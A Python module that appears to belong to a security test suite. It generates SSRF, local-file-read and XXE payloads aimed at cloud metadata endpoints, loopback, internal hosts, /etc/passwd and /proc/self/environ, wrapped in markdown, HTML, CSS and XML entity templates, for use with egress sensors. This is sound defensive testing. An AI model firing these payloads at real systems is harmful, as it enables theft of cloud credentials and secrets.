"""Payloads that make a fetching sink fetch.

Each entry exists because it is a class we have been burned by, or a class the
same sink trivially extends to.  The export incident is the first two wrappers:
stored markdown and stored HTML carrying a URL into a server-side renderer.

Pair this with pytest-egress-guard or the Falco rules -- the corpus makes the
attempt happen, the sensors notice it.  Neither half is useful alone.

Shared across repos on purpose: a payload added because one repo got burned
should harden the other three the same day.
"""

from __future__ import annotations

#: A host that resolves nowhere.  Any attempt to reach it is unambiguous, and it
#: is the hook for a self-hosted OAST callback server later.
CANARY_HOST = "egress-canary.invalid"

#: Present in every payload, so a reflection check is one substring search.
#: Deliberately alphanumeric: a probe containing `<` or `&` would be altered by
#: correct HTML escaping, and a reflection check would then report a false clean
#: on a response that escaped the brackets but still echoed the attacker's text.
REFLECTION_PROBE = "gdsprobe7f3a"

FETCH_URLS: tuple[str, ...] = (
    f"http://169.254.169.254/latest/meta-data/{REFLECTION_PROBE}",   # cloud metadata
    f"http://[::ffff:169.254.169.254]/{REFLECTION_PROBE}",           # same, IPv6-mapped
    f"http://127.0.0.1:5002/healthz?{REFLECTION_PROBE}",             # loopback to self
    f"http://internal-service.local/{REFLECTION_PROBE}",             # cluster-internal name
    f"http://{CANARY_HOST}/{REFLECTION_PROBE}",                      # unique canary
    f"file:///etc/passwd#{REFLECTION_PROBE}",                        # LFI
    f"file:///proc/self/environ#{REFLECTION_PROBE}",                 # LFI, env secrets
)

WRAPPERS: tuple[str, ...] = (
    "{url}",
    "![x]({url})",                                    # markdown image
    "[click]({url})",                                 # markdown link
    '<img src="{url}">',
    '<iframe src="{url}"></iframe>',
    '<object data="{url}"></object>',
    '<link rel="stylesheet" href="{url}">',
    '<style>@import url("{url}");</style>',           # CSS fetch in a renderer
    '<!DOCTYPE r [<!ENTITY x SYSTEM "{url}">]><r>&x;</r>',   # XXE
)


def fetch_payloads() -> tuple[str, ...]:
    """Return every wrapper applied to every URL.

    Google-style: no args, returns the cross product of ``WRAPPERS`` and
    ``FETCH_URLS`` so a caller gets one flat tuple of ready-to-send payloads
    rather than having to nest the loop itself.

    Returns:
        The cross product of ``WRAPPERS`` and ``FETCH_URLS``, wrapper-major
        (all URLs for a wrapper before moving to the next wrapper), as a tuple
        of length ``len(WRAPPERS) * len(FETCH_URLS)``.
    """
    return tuple(w.format(url=u) for w in WRAPPERS for u in FETCH_URLS)
